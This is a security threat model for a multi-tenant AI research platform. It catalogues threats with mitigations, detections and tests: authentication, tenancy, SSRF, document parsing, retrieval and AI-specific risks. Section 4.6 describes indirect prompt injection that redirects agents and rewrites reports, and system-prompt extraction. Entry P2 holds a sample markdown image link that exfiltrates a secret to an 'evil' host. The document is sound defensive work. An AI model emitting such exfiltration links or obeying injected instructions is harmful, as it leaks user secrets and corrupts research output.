# Threat Model

Methodology: assets → actors → trust boundaries → STRIDE threats per component, each with impact,
likelihood, mitigation, detection and response. Ratings are qualitative (High / Medium / Low).
Every mitigation names the code or test that implements it, so this document can be audited
against the repository. Reviewed at the end of every roadmap phase.

## 1. Assets

| Asset | Why it matters | Classification |
|---|---|---|
| Organisation documents and their chunks/embeddings | customers' confidential knowledge | confidential / restricted |
| Research objectives, findings, reports | reveal strategy (what a company is investigating) | confidential |
| Credentials: password hashes, refresh tokens, API keys, MFA secrets | account takeover | restricted |
| Signing and encryption keys (JWT Ed25519, AES-GCM data keys, API-key pepper, audit HMAC key) | forge any identity, decrypt secrets, forge the audit trail | restricted |
| LLM / search provider credentials | financial loss, data exfiltration through our account | restricted |
| Audit log | forensic truth after an incident | internal, integrity-critical |
| Availability of workers and budgets | cost blow-ups, denial of service | - |

## 2. Threat actors

| Actor | Capability | Typical goal |
|---|---|---|
| Unauthenticated attacker | sends arbitrary HTTP requests | account takeover, enumeration, DoS |
| Malicious user (legitimate account) | authenticated API access within one organisation | read another tenant's data, escalate role, abuse compute |
| Compromised account / stolen token | acts as a real user | data theft, persistence (API keys) |
| Malicious website / search result | controls content the platform fetches | SSRF, prompt injection, data poisoning, parser exploits |
| Malicious document author | controls an uploaded file | parser exploits, zip bombs, indirect prompt injection |
| Prompt-injection attacker | plants instructions in any ingested text | tool abuse, exfiltration, report manipulation |
| Insider (operator) | database or infrastructure access | read secrets, tamper with audit records |
| Automated attacker | high request volume | credential stuffing, scraping, cost exhaustion |

## 3. Trust boundaries

See [system-architecture.md §5](../architecture/system-architecture.md#5-trust-boundaries):
TB1 Internet→API, TB2 tenant↔tenant, TB3 worker→web, TB4 untrusted content→LLM context,
TB5 LLM output→application, TB6 platform→LLM provider, TB7 upload→parser, TB8 application→database.

## 4. Threats

Legend: **S**poofing, **T**ampering, **R**epudiation, **I**nformation disclosure, **D**enial of
service, **E**levation of privilege.

### 4.1 Authentication and sessions

| ID | STRIDE | Threat | Impact | Likelihood | Mitigation | Detection | Response |
|---|---|---|---|---|---|---|---|
| A1 | S | Credential stuffing / brute force on `/auth/login` | High | High | GCRA limits per IP and per e-mail (hashed key); progressive temporary lockout; Argon2id cost | `auth.login.failed` audit events; 401 rate on `/api/v1/auth/login` (`argus_http_requests_total{status="401"}`, alert `ArgusLoginFailureSurge`) | block IP range at edge; force password reset for targeted accounts |
| A2 | I | User enumeration through login, registration or reset responses/timing | Medium | High | identical responses; dummy Argon2 verification for unknown e-mails; reset always `202` | - | - |
| A3 | S | Stolen refresh token replayed | High | Medium | single-use rotation; reuse revokes the whole session family | `auth.refresh.reuse_detected` (security severity) | user notified; session revoked automatically |
| A4 | S | Forged or algorithm-confused JWT (`alg: none`, HS/RS confusion) | Critical | Low | verifier pins `EdDSA`, `iss`, `aud`, requires `exp/nbf/iat/sub/sid/jti`; keys selected by `kid` from a fixed keyring | verification-failure metric | rotate signing key, revoke sessions |
| A5 | S | Session survives logout / password change | High | Medium | per-request session check; password change/reset revokes other sessions | - | - |
| A6 | S | MFA bypass: TOTP replay, brute force of the 6-digit code | High | Medium | last-used step stored; challenge tokens single-use with attempt cap; rate limit | `auth.mfa.failed` events | lock MFA challenge, notify user |
| A7 | I | Tokens or keys leak into logs, URLs, errors, analytics, prompts | High | Medium | header-only credentials (query tokens rejected); redaction processor on every log event and every LLM payload; problem responses never echo input | secret scanning on logs in CI tests (`tests/security/test_redaction.py`) | rotate exposed secret |
| A8 | E | API key with excessive power | High | Medium | scopes ∩ owner role at every request; expiry; per-key rate limit; last-used tracking; `security:manage` and other administrative permissions can never be delegated to a key | a revoked, expired or disabled key that is still used is audited in its organisation and counted in the security summary; stale and non-expiring keys are flagged | revoke key (one call), audit |
| A9 | S | Password-reset token theft or reuse | High | Low | 256-bit token, stored hashed, 30-minute expiry, single use, all sessions revoked on reset | `auth.password.reset` event | - |

### 4.2 Authorisation and tenancy

| ID | STRIDE | Threat | Impact | Likelihood | Mitigation | Detection | Response |
|---|---|---|---|---|---|---|---|
| T1 | I | IDOR: read another organisation's resource by id | Critical | High | org id from the URL is checked against membership; every repository query filters by `organization_id`; RLS; foreign ids return 404 | tenant-isolation test suite (`tests/integration/test_tenant_isolation.py`) runs as the runtime role | incident process; audit queries by actor |
| T2 | E | Role escalation (analyst grants self admin, admin creates owner) | High | Medium | role-change rules: only owners grant owner; nobody edits their own role; last owner cannot be removed | `members.role_changed` audit | revert, revoke sessions |
| T3 | I | Cross-tenant reference via forged foreign key in a create request | High | Medium | composite `(organization_id, id)` foreign keys | constraint violations logged | - |
| T4 | I | Restricted project data visible to every org member | Medium | Medium | `visibility = restricted` requires explicit project membership (owners/admins excepted) | - | - |
| T5 | E | Raw SQL in a new feature forgets the tenant filter | Critical | Medium | RLS fails closed when `argus.org_id` is unset; runtime role lacks `BYPASSRLS` | integration test asserts zero rows without context | - |

### 4.3 Web research and egress

| ID | STRIDE | Threat | Impact | Likelihood | Mitigation | Detection | Response |
|---|---|---|---|---|---|---|---|
| W1 | I/E | SSRF to localhost, private ranges, cloud metadata (169.254.169.254, fd00:ec2::254) | Critical | High | resolve-validate-**pin** network backend; every resolved address must be global; IPv4 literal normalisation; v4-in-v6 forms checked | `egress.blocked` events with reason | block domain/org; review |
| W2 | I/E | DNS rebinding between check and connect | Critical | Medium | connection uses the validated IP (no second resolution) | - | - |
| W3 | I | Redirect to an internal address or to `file://`/`gopher://` | High | High | manual redirects, each hop re-validated, http/https only, hop limit, no HTTPS→HTTP downgrade | - | - |
| W4 | D | Decompression bomb, endless body, slowloris response | High | Medium | streamed body with cap after decompression and bounded inflation per chunk; overall deadline; content-type allow-list | `fetch.aborted{reason}` metric | - |
| W5 | T | Data poisoning (fake page claims false facts) | High | High | source reputation tiers, multi-source verification, contradiction detection, provenance on every claim, confidence scoring | contradiction reports | domain policy `block` |
| W6 | D | Crawler abuse of third-party sites (our infrastructure used for DoS) | Medium | Medium | robots.txt, per-domain politeness via Redis, max pages per job, identifiable User-Agent | - | - |
| W7 | E | Proxy environment variables route traffic through an attacker-chosen proxy | High | Low | `trust_env=False` on every egress client | - | - |

### 4.4 Documents

| ID | STRIDE | Threat | Impact | Likelihood | Mitigation | Detection | Response |
|---|---|---|---|---|---|---|---|
| D1 | E | Parser exploit (malformed PDF/DOCX) | High | Medium | parsing only in a fresh subprocess: empty environment (no secrets), isolated interpreter, private temp dir, timeout with process-group kill, POSIX limits (memory, CPU, no file writes, no child processes); output schema-validated and re-sanitised by the parent | `argus_documents_total{event="failed"}`; security audit `document.processing_refused` on timeouts, resource limits and crashes | document marked `failed`; investigate the sample; kernel sandbox (gVisor) for high-risk tenants |
| D2 | D | Zip bomb / XML bomb in DOCX | High | Medium | entry count, total uncompressed size and ratio checked from the ZIP directory *before* reading; defusedxml forbids entities | - | - |
| D3 | T | Disguised file type (`.pdf` that is an executable) | Medium | High | magic-byte sniffing decides the type; extension and declared MIME must agree with it; executables rejected | - | - |
| D4 | I | Malware stored and later downloaded by colleagues | Medium | Medium | ClamAV `INSTREAM` scan before any parse or download; outages retry, never skip; `quarantined` files are never served; downloads only through the API (authenticated, or 5-minute signed links re-authorised on use) with `attachment`, `nosniff`, CSP `sandbox` | security audit `document.quarantined`; `argus_documents_total{event="quarantined"}` | notify the uploader's admins; keep the encrypted sample for analysis |
| D5 | T | Path traversal via filename | High | Medium | storage keys are server-generated UUID paths validated against a strict pattern and contained in the storage root; filenames are display-only and sanitised (path segments, controls, bidi overrides) | - | - |
| D6 | I | Bucket or storage credentials leak; object copied to another tenant's path | High | Low | envelope encryption in the application (per-object AES-256-GCM key wrapped by the keyring), bound to the storage key as associated data; no pre-signed bucket URLs | decryption failures logged; integrity hash checked on every read | rotate the keyring's KEK and re-wrap |

### 4.5 Knowledge and retrieval

| ID | STRIDE | Threat | Impact | Likelihood | Mitigation | Detection | Response |
|---|---|---|---|---|---|---|---|
| R1 | I | Semantic search returns another tenant's, another project's or a restricted chunk | Critical | Medium | the search scope (organisation, project, classification ceiling, origins allowed by permissions) is computed before retrieval and is the SQL `WHERE` of both candidate searches; RLS on `document_chunks`; composite same-tenant foreign keys; the model never filters | integration tests run every search as the runtime role | - |
| R2 | I | Confidential text sent to an external embedding or rerank provider | High | Medium | organisation data policy (highest classification per provider locality) applied before any text leaves the process; withheld chunks stay keyword-searchable; reranking falls back to the local reranker | `knowledge.embedding_withheld` log events | - |
| R3 | T | Poisoned or injected content steers answers | High | High | every chunk carries the stricter of its own and its parent's injection level; high-risk chunks are indexed (for review) but excluded from retrieval by default; evidence is packed in nonce-delimited blocks the text cannot close | `argus_injection_detections_total` | block the domain; delete the document |
| R4 | I | Retrieval cache serves stale or foreign results | Medium | Low | cache keys bind organisation, projects and their corpus versions, scope, model and query; entries are AES-GCM encrypted with the key as associated data; TTL | - | flush the namespace |
| R5 | I | A deleted document remains retrievable | High | Low | chunks and embeddings cascade in the deletion transaction; the corpus version bump invalidates cached searches | integration test | - |

### 4.6 AI-specific threats

| ID | STRIDE | Threat | Impact | Likelihood | Mitigation | Detection | Response |
|---|---|---|---|---|---|---|---|
| P1 | E | Indirect prompt injection makes an agent call tools | Critical | High | plan-then-execute (the planner sees only the objective; code executes the plan); web search and fetching are code, not tools; declared tool catalogue (undeclared or mis-declared tools refused); taint rule enforced at run start and across the catalogue in CI; per-agent allow-lists; tool requests only via typed output fields; schema-validated arguments | `agent.tool_denied` audit events, `argus_agent_tool_calls_total{outcome}` | kill switch for agent/tool |
| P2 | I | Exfiltration through generated links/images (`![](https://evil/?q=secret)`) | High | Medium | secrets never enter prompts (redaction); URLs in any source-derived text are defanged (`hxxps://`); Markdown escapes every structural character, so no link, image or HTML can be produced from text; only collected `http(s)` source URLs are linked; CSV formula cells neutralised; PDFs without scripts | export audit events | revoke access, delete the report |
| P3 | T | Injected text rewrites the report ("say Company X is fraudulent") | High | Medium | spotlighting (nonce-delimited data); high-risk chunks excluded from retrieval; findings need verified quotes and entailment; claims phrased as instructions to an AI, or supported only by content flagged as a possible injection, are refused; only supported findings reach the report and rejected ones are never printed; instruction-like report prose is removed; report prose resting only on rejected findings is removed; critic review | injection-risk counters per source, verification verdict counts | block domain |
| P4 | I | System prompt / policy extraction | Low | High | no secrets in prompts; prompts are versioned files that may be public; refusal is not relied upon | - | - |
| P5 | T | Hallucinated citations, figures or claims | High | High | citations must reference evidence the analyst was given and quote text present in the chunk; every figure in a statement must appear in its evidence; a verifier may only lower verdicts; unsupported facts become low-confidence hypotheses excluded from the report; prose sentences with figures absent from the evidence are removed; unknowns say "Insufficient evidence." | report quality (grounding, references), citation-accuracy metric in evaluations | - |
| P6 | D | Runaway cost (agent loops, huge contexts) | High | Medium | iteration/tool-call/token/cost/runtime budgets per agent and per job; organisation monthly budget; kill switches | `llm_cost_usd_total` alerts | kill switch, raise budget only by approval |
| P7 | I | Confidential data sent to an external provider against policy | High | Medium | classification × organisation policy enforced in the gateway before any network call; local provider route | `llm.blocked_by_policy` events | - |
| P8 | T | Model returns malformed or over-privileged structured output | Medium | High | Pydantic validation with bounded lengths; one repair attempt; never `eval` | `llm_output_invalid_total` | - |
| P9 | E | A background job acts with more rights than its creator has now (revoked member, revoked key, a narrowly scoped key using its owner's role) | High | Medium | every stage re-authorises the creator with the request-time rules (role ∩ key scopes, key revocation and expiry, user status, membership); job creation requires the permissions its mode uses | `access_revoked` job failures | revoke the key or membership: running jobs stop at their next stage |
| P10 | I | Research results leak evidence above the viewer's clearance (a statement carries what the model read, even uncited) | High | Medium | findings record the highest classification the analyst read and are withheld from viewers below it; citations filtered by the viewer's ceiling and origin permissions; agent-run arguments redacted likewise; results need read access to the job's origins | - | - |

### 4.7 Platform

| ID | STRIDE | Threat | Impact | Likelihood | Mitigation | Detection | Response |
|---|---|---|---|---|---|---|---|
| X1 | R | Actor denies an action; insider edits, deletes or appends audit rows | High | Low | append-only audit with HMAC chain (key outside the database); runtime role cannot update/delete; verification recomputes every chain from the genesis hash and sequence 1 in a snapshot transaction (edits, first/middle/last-row deletions, rows appended behind the head, a rewritten head); the scheduler verifies every organisation at least daily; operators verify the platform chain with `argus audit verify` | `audit_verifications` history, `audit.integrity_failed` audit event, in-app and e-mail alert to owners/admins once per distinct break, `argus_audit_verifications_total{result="broken"}`, critical item in the security summary | preserve the database as is; incident; compare with backups |
| X2 | I | Stack traces / SQL / paths in error responses | Medium | Medium | RFC 9457 problem documents with fixed messages; details only in logs (redacted) | - | - |
| X3 | D | Large or slow request bodies | Medium | High | ASGI body-size cap (also for chunked bodies), per-request timeout, edge limits | 413/504 metrics | - |
| X4 | D | Duplicate expensive submissions | Medium | Medium | `Idempotency-Key` stored in the same transaction as the job | - | - |
| X5 | T | Supply-chain compromise of a dependency, base image, action or the published image | High | Low | lockfile with hashes, pip-audit, Dependabot with cooldown, SHA-pinned CI actions and digest-pinned images (enforced by `tests/unit/test_delivery_policy.py`), SBOM and SLSA provenance attestations, Trivy on build and on the pushed digest, cosign keyless signature verified against the release workflow identity before deployment | CI; `cosign verify` at deploy | pin/rollback to the previous signed digest |
| X6 | I | Secrets committed to Git | High | Medium | gitleaks pre-commit + CI; `.env` ignored; production refuses default secrets | CI | rotate |
| X7 | I | Redis exposed / shared namespace | Medium | Low | authentication, internal network only, key prefix per deployment, TTL on every key, no tenant data at rest in Redis beyond cache entries keyed by organisation | - | flush namespace |
| X8 | I | Alerts carry attacker content (phishing links, instructions) from a monitored page | Medium | Medium | monitored URLs pass the SSRF checks at creation and the guarded fetcher on every run; summaries and diff excerpts are sanitised and URL-defanged; instruction-like summaries are withheld; notification links are application paths only; e-mails are plain text; recipients re-checked against current membership | - | pause the monitor |
| X9 | E/D | Kill switches misused: a stolen API key or a member stops (or resumes) AI activity, a tenant touches another tenant's or the platform's switches, a typo leaves the wrong thing running | High | Low | `security:manage` (owners/admins) and never grantable to API keys; switches written only in the caller's organisation (explicit filter + RLS write policy); platform-wide switches need the owner database role (`argus killswitch`) and are shown read-only; targets validated against the declared agents, tools and providers; optional expiry; duplicates refused | `kill_switch.engaged/released` audit events with the real actor and client; alert to every owner/admin on engage | release the switch; revoke the account |
| X10 | I/R | A member probes for permissions they lack, or floods the audit log with refused requests | Medium | Medium | every 403 of a member (route permission or role rule inside a service) is audited as `access.denied` with route template, method and missing permission, under a budget of 30 per principal per 10 minutes; non-members get 404 and cannot write into the tenant's log | security events feed; `argus_access_denied_total{recorded}`; "many denials" recommendation | review the member's role; suspend the account |
| X11 | E/I | A new endpoint ships without authentication, without the tenant check, or fails open on malformed input | Critical | Medium | authorisation dependencies on every route; the OpenAPI-driven API surface suite (every non-public operation must answer 401 anonymously; every organisation-scoped operation 404 to another tenant's owner and API key; hostile paths, queries and bodies never cause a 5xx or leak internals); a reviewed list of public operations | CI | block the release |
| X12 | I | Telemetry becomes a data leak: traces, metrics or logs carry personal data, prompts, document text or credentials; trace headers reach third-party sites; framework telemetry exports submitted values | High | Medium | allow-listed span attributes (route templates, hosts, ids, counts); SQL parameterised and redacted; errors by type only; no HTTP-client auto-instrumentation (no `traceparent` to fetched sites); FastAPI native telemetry disabled; collector deletes forbidden keys; bounded metric labels; https collector required in production | `tests/integration/test_observability.py` scans every attribute of a full research trace | rotate the trace store, purge affected traces |
| X13 | S/T | Clients forge trace context to splice into or collide with other traces | Low | Medium | incoming `traceparent` ignored unless `trust_incoming_trace_context` (behind a gateway); `jobs.trace_parent` accepts only the W3C format (CHECK) | - | - |

### 4.8 SaaS operation and the web dashboard

| ID | STRIDE | Threat | Impact | Likelihood | Mitigation | Detection | Response |
|---|---|---|---|---|---|---|---|
| S1 | D/E | Concurrent requests each see room and together exceed the plan | Medium | High | `quotas.enforce` counts inside the creating transaction under a transaction advisory lock per organisation and metric; an unknown plan name is treated as `free` (fails closed) | `quota_exceeded` problem responses | - |
| S2 | E | An organisation raises its own model budget past its plan | Medium | Medium | budget updates above the plan's ceiling refused (422); the ledger uses `min(organisation budget, plan ceiling)` | - | - |
| S3 | I | A data export carries another tenant's rows, credentials or internals - or files the scanner quarantined | Critical | Low | built by a worker in the organisation's RLS context in one snapshot; explicit column lists (no password, key or token hashes, MFA secrets, embeddings); only documents a member could download (never quarantined or unscanned); `org:export` is owner-only and never delegable to API keys; the requester must still be an owner at build and download | `org.export_requested` / `org.export_downloaded` audit events | revoke the owner; delete the export |
| S4 | T/I | The archive is tampered with in storage, served after expiry, or writes outside its folder on extraction | Medium | Low | sealed (AES-GCM, bound to its storage key); SHA-256 checked before every download; expires after `export_ttl_days` with its blob; entry names generated from ids and sanitised names | `export.integrity_mismatch` log | - |
| S5 | D | Exports used to exhaust workers, storage or API memory | Medium | Medium | 3 requests per organisation per day; one pending at a time (unique index, so concurrent requests cannot both start one); included documents capped (128 MiB default, 1 GiB maximum) and the archive kept below the single-object encryption limit; at most two archives decrypted at once per API process; 10 downloads per hour per user | rate-limit responses | - |
| S6 | T/R | Retention used to erase evidence; pruning breaks audit verification; a tenant prunes another chain; forged rows hidden below a checkpoint | High | Low | the append-only trigger allows audit DELETEs only to the schema owner inside `argus_prune_audit`; never rows younger than 90 days; only behind an HMAC-signed checkpoint whose anchor row must match; an organisation context prunes only its own chain, the platform chain needs the owner role; the service prunes only a chain that verifies; operators cannot prune below the retention a chain is owed; checkpoints are append-only, verified and readable only for the own organisation; a trigger refuses new rows at or below a checkpoint | `audit.pruned` events; verification reasons `checkpoint forged`, `rows below the checkpoint` | restore from backup; incident |
| S7 | E | A suspended or deleted organisation keeps acting through API keys, monitors or queued work | High | Medium | `active` required by every access check; API keys of inactive organisations refused (and revoked at deletion); due monitors of inactive organisations not claimed | integration tests | - |
| S8 | I/T | A purge leaves tenant data behind, removes audit history, or is undone half-way (an organisation back with its files gone) | Medium | Low | `purging` committed before any file is touched - no restore after that point, members see nothing, the next run finishes an interrupted purge; blobs (documents, exports) deleted, then the organisation row with every tenant table through same-tenant cascades; the audit chain stays by design; `org.purge_started` and `org.purged` recorded | audit events | the scheduler resumes the purge |
| S9 | I/E | XSS in the web dashboard (titles, summaries and URLs come from untrusted pages) steals tokens or acts as the user; a signed-out page comes back (late refresh, back/forward cache) | Critical | Medium | every value rendered as text; CSP: same-origin files only, no inline script or style, `require-trusted-types-for 'script'` with no policies; tokens in memory only; idle sign-out after 30 minutes; sign-out on leaving the page, and a page kept in the back/forward cache clears itself; session epochs drop late answers; links only for http(s) URLs with `noopener noreferrer nofollow` | `tests/unit/test_web_dashboard.py`, `tests/web/dashboard.test.mjs` | sign out everywhere (`/auth/logout-all`) |
| S10 | S/I | Clickjacking or CSRF against the dashboard; referrer leaks | Medium | Low | `frame-ancestors 'none'` and `X-Frame-Options: DENY`; bearer tokens only (no ambient cookie authority); `Referrer-Policy: no-referrer`; `form-action 'none'` | - | - |
| S11 | I | The dashboard shows a member - or a narrowly scoped API key - more than its permissions allow | Medium | Medium | the overview applies the authoriser's project-visibility rule and, per section, the permission of the endpoint behind it (`projects:read`, `research:read`, `reports:read`, `sources:read`, `documents:read`, `monitors:read`, `usage:read`, `audit:read`); opening a report is re-authorised by the API | `test_dashboard_respects_what_each_viewer_may_see` | - |
| S12 | E | A route served outside the OpenAPI document escapes the API surface suite | High | Low | a reviewed list of undocumented routes (docs, metrics, dashboard files), enforced by a test | CI | block the release |

## 5. Residual risks (accepted, documented)

* **LLM-based classifiers are themselves injectable.** The heuristic injection detector is the
  always-on first layer; the optional LLM classifier is advisory only and never grants anything.
* **A compromised worker host** sees decrypted content in memory. Workers run with the least
  privileges possible and hold no signing keys; signing keys live only in the API process.
* **Data poisoning cannot be fully prevented**, only made visible: every claim carries provenance,
  confidence and contradictions.
* **pgvector < 0.8 filtered search** can under-fill results (availability, not confidentiality).
* **Derived statements outlive their evidence.** Deleting a document deletes its chunks and the
  citations to them, and findings stop being presented as verified; retention deletes superseded
  page versions the same way. The statement text of a finding stays until its job is deleted:
  delete the job to remove its findings and report.
* **Plan limits apply to creation.** Moving an organisation to a smaller plan deletes nothing;
  it cannot create more until it is under the new limits.
* **Tokens in the dashboard's memory** are readable by a successful XSS or a malicious browser
  extension. CSP with Trusted Types makes the first unlikely, short access-token lifetimes and
  sign-out on idle and on tab close bound the damage; extensions are outside the platform's
  control.
* **Kill switches act within the cache window** (about five seconds per process), not instantly.
* **The audit chain is only as strong as the separation of its key.** Someone holding both
  database superuser access *and* the audit HMAC key can rewrite rows and the head consistently.
  The key lives in the secret store, never in the database; anchoring chain heads outside the
  database (write-once storage) is the planned next step (phase 23 runbooks).
* **The audit HMAC key cannot be rotated in place.** One key verifies a whole chain; after a
  suspected key leak, history is trusted through evidence exported and verified beforehand
  (`argus audit export`) until a re-keyed chain epoch exists.
* **Platform-chain verification is an operator task.** Logins and registrations belong to no
  tenant, so the runtime role cannot read them; `argus audit verify` (owner role) checks them and
  runs daily in production as the `argus-audit-verify` CronJob.
* **Research about prompt injection itself is limited.** Content that reads as instructions to an AI is never used as evidence, so findings that quote injection payloads (for example from a security article) are refused; the documents remain searchable with their risk flag.

## 6. Security testing map

| Threat ids | Tests |
|---|---|
| A1-A9 | `tests/security/test_auth_primitives.py`, `tests/integration/test_auth_flows.py` |
| T1-T5 | `tests/integration/test_tenant_isolation.py`, `tests/integration/test_tenancy.py` |
| W1-W7 | `tests/security/test_ssrf.py` (incl. Hypothesis property tests), `tests/security/test_fetcher.py`, `tests/security/test_untrusted_text.py`, `tests/unit/test_web_research.py`, `tests/integration/test_sources.py` |
| D1-D6 | `tests/security/test_documents_parsing.py`, `tests/security/test_documents_storage.py`, `tests/integration/test_documents.py` |
| R1-R5 | `tests/integration/test_knowledge.py`, `tests/unit/test_knowledge_units.py` |
| P1-P10 | `tests/security/test_untrusted_text.py` (classifier), `tests/unit/test_llm_units.py`, `tests/integration/test_llm_gateway.py`, `tests/integration/test_answers.py`, `tests/unit/test_agents_units.py` (catalogue-wide taint rule), `tests/integration/test_agents.py`, `tests/integration/test_research_agents.py`, `tests/unit/test_reporting_units.py`, `tests/integration/test_reports.py`, `tests/security/test_red_team.py` (worst-case obedient model), `tests/eval/test_offline_suite.py` (dataset with injection through every channel) |
| X1-X8 | `tests/integration/test_auth_flows.py` (audit chain integrity, append-only audit), `tests/integration/test_security_center.py` (scheduled verification; edited, deleted-first, deleted-last and forged rows), `tests/unit/test_api_foundation.py` (problem documents, headers, host and proxy handling), `tests/unit/test_config.py`, `tests/unit/test_redaction.py` |
| X9-X10 | `tests/integration/test_security_center.py` (kill-switch roles, keys, tenants and platform switches; denial auditing and its budget), `tests/unit/test_security_center_units.py` |
| X11 | `tests/security/test_api_surface.py` (every operation in the OpenAPI document) |
| X12-X13 | `tests/integration/test_observability.py`, `tests/unit/test_observability_units.py`, `tests/unit/test_observability_assets.py` |
| S1-S8, S11 | `tests/integration/test_platform.py` |
| S9-S10 | `tests/unit/test_web_dashboard.py` |
| S12 | `tests/unit/test_api_foundation.py` (`test_every_route_outside_the_openapi_document_is_reviewed`) |
